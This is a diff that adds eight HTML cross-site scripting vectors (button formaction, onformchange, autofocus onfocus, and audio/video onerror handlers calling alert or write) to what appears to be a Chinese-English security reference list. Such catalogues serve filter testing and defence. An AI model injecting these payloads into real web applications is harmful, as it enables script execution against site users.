@@ -501,6 +501,14 @@ Cross-site scripting (跨站脚本):
   - `<table background=javascript:...>`.
   - `<td background=javascript:...>`.
   - `<button onmouseover="alert(/1/)" onclick="alert(/2/)"></button>`.
+  - `<button form="test" formaction="javascript:alert(1)">`.
+  - `<button form=test onformchange=alert(2)>`.
+  - `<input onfocus=write(1) autofocus>`.
+  - `<form id=test onforminput=alert(1)><input></form>`.
+  - `<audio onerror=javascript:alert(1)>`.
+  - `<audio><source onerror="javascript:alert(1)"></audio>`.
+  - `<video onerror=javascript:alert(1)>`.
+  - `<video><source onerror="javascript:alert(1)"></video>`.
   - `@import ""`.
   - `background: url("")`.
   - `document.write()`.
